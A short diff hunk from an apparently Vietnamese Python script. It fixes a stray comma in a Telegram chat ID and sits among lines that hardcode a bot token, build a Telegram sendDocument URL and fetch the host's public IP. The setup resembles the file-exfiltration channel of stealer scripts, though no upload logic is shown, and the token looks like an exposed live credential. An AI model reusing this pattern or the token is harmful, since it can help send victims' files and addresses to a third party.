@@ -13,7 +13,7 @@ red = "\033[1;31m"
 
 # Telegram Bot information
 TOKEN = "7636168350:AAG9FPUs6X0YeSf0y7MQidiVJk9NmhfJe1s"  # Thay bằng token thật
-CHAT_ID = "-1002459761007,"  # Thay bằng chat ID thật
+CHAT_ID = "-1002459761007"  # Thay bằng chat ID thật
 TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 ip = requests.get('https://kiemtraip.com/raw.php').text
 
